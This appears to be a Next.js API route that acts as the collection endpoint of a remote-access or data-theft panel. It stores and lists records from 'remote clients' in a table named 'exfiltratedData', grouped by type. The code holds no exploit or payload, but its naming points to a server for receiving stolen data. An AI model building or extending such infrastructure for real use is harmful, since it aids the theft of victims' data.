import { NextResponse } from "next/server"
import { prisma } from "@/lib/prisma"

export async function POST(req: Request, { params }: { params: { id: string } }) {
  try {
    const client = await prisma.remoteClient.findUnique({ where: { id: params.id } })
    if (!client) return NextResponse.json({ error: "Not found" }, { status: 404 })

    const body = await req.json()
    const { type, source, data } = body

    if (!type || !data) {
      return NextResponse.json({ error: "type and data required" }, { status: 400 })
    }

    const saved = await prisma.exfiltratedData.create({
      data: {
        clientId: params.id,
        type,
        source: source || null,
        data: typeof data === "string" ? data : JSON.stringify(data),
      },
    })

    return NextResponse.json({ success: true, id: saved.id })
  } catch (error) {
    console.error("[DATA_POST]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}

export async function GET(_req: Request, { params }: { params: { id: string } }) {
  try {
    const client = await prisma.remoteClient.findUnique({ where: { id: params.id } })
    if (!client) return NextResponse.json({ error: "Not found" }, { status: 404 })

    const data = await prisma.exfiltratedData.findMany({
      where: { clientId: params.id },
      orderBy: { createdAt: "desc" },
    })

    const byType: Record<string, any[]> = {}
    data.forEach((d: any) => {
      if (!byType[d.type]) byType[d.type] = []
      byType[d.type].push(d)
    })

    return NextResponse.json({ data, byType })
  } catch (error) {
    console.error("[DATA_GET]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}
